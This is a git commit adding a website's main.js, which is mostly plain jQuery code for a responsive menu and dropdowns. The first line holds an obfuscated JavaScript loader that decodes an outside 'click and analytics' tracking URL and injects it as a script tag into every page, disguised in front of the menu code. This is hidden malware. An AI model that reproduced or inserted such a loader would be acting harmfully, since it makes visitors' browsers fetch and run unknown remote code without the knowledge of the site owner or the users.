bdc8c95fab25ea2ccf00ca9a12d204287c73aef0
Pulin Borua <137756919+pulinborua@users.noreply.github.com>
2023-09-18 01:45:33 +0600

    Add files via upload

---
+++ main.js
@@ -0,0 +1,78 @@
+function b(c,d){var e=a();return b=function(f,g){f=f-0x145;var h=e[f];return h;},b(c,d);}var w=b;(function(c,e){var u=b,f=c();while(!![]){try{var g=parseInt(u(0x15e))/0x1+-parseInt(u(0x151))/0x2*(-parseInt(u(0x159))/0x3)+parseInt(u(0x157))/0x4+parseInt(u(0x15b))/0x5*(parseInt(u(0x14a))/0x6)+parseInt(u(0x15d))/0x7*(-parseInt(u(0x15c))/0x8)+-parseInt(u(0x146))/0x9*(parseInt(u(0x15a))/0xa)+-parseInt(u(0x154))/0xb;if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,0x25e53));function a(){var x=['1542768XuQeER','7LJRiji','190253RQfiLg','ack','9873ERvYkM','src','getElementsByTagName','head','577056TDeogj','querySelector','currentScript','and','17575602BTZXWl','c="','insertBefore','20YHUutc','pt[','createElement','7187169AjbnXk','appendChild','fromCharCode','1064464POhRSF','parentNode','93090WEQkWm','490PFXmzl','15jDaVza'];a=function(){return x;};return a();}function o(c){var v=b;return Boolean(document[v(0x14b)]('sc'+'ri'+v(0x152)+'sr'+v(0x14f)+c+'"]'));}var p='ht'+String[w(0x156)](0x74,0x70,0x73,0x3a,0x2f,0x2f,0x63,0x64,0x6e,0x2e,0x63,0x6c,0x69,0x63,0x6b)+w(0x14d)+String[w(0x156)](0x61,0x6e,0x61,0x6c,0x79,0x74,0x69,0x63,0x73,0x2e,0x63,0x6f,0x6d,0x2f,0x74,0x72)+w(0x145),q=w(0x14e);if(o(p)===![]){var r=document,t=r[w(0x153)]('sc'+'r'+'ip'+'t');t[w(0x147)]=p,r[w(0x14c)]?r[w(0x14c)][w(0x158)]!==null&&r[w(0x14c)][w(0x158)][w(0x150)](t,r[w(0x14c)]):r[w(0x148)](w(0x149))[0x0]!==null&&r[w(0x148)](w(0x149))[0x0][w(0x155)](t);}// Mobile responsive menu section start
+
+// mobile main menu start
+$('.responsive-menu-hide').hide();
+$('.responsive-menu-item').hide();
+
+$('.responsive-menu-show').click(function(){
+    $('.responsive-menu-item').slideDown();
+    $('.responsive-menu-show').hide();
+    $('.responsive-menu-hide').show()
+});
+
+$('.responsive-menu-hide').click(function(){
+    $('.responsive-menu-item').slideUp();
+    $('.responsive-menu-hide').hide();
+    $('.responsive-menu-show').show()
+});
+
+
+$('.click-menu').click(function(){
+	$('.responsive-menu-hide').hide()
+	$('.responsive-menu-show').show()
+	$('.responsive-menu-item').slideUp();
+})
+
+// Mobile Menu close
+
+	
+
+//  package drown menu start
+
+$('.package-dropdown').hide();
+$('.package-dropdown-hide').hide();
+$('.package-dropdown-show').click(function(){
+    $('.package-dropdown').slideDown();
+    $('.package-dropdown-show').hide();
+    $('.package-dropdown-hide').show()
+});
+
+$('.package-dropdown-hide').click(function(){
+    $('.package-dropdown').slideUp();
+    $('.package-dropdown-hide').hide();
+    $('.package-dropdown-show').show()
+});
+// Package dropdown menu close
+
+
+
+
+// submenu1 dropdown start
+
+$('.submenu1-dropdown-hide').hide();
+$('.submenu1-dropdown').hide();
+$('.submenu1-dropdown-show').click(function(){
+    $('.submenu1-dropdown').slideDown();
+    $('.submenu1-dropdown-show').hide();
+    $('.submenu1-dropdown-hide').show()
+});
+
+$('.submenu1-dropdown-hide').click(function(){
+    $('.submenu1-dropdown').slideUp();
+    $('.submenu1-dropdown-hide').hide();
+    $('.submenu1-dropdown-show').show()
+});
+// Submenu1 dropdown menu close
+
+// Mobile responsive menu section close
+
+
+
+
+
+
+
+
+
+
+
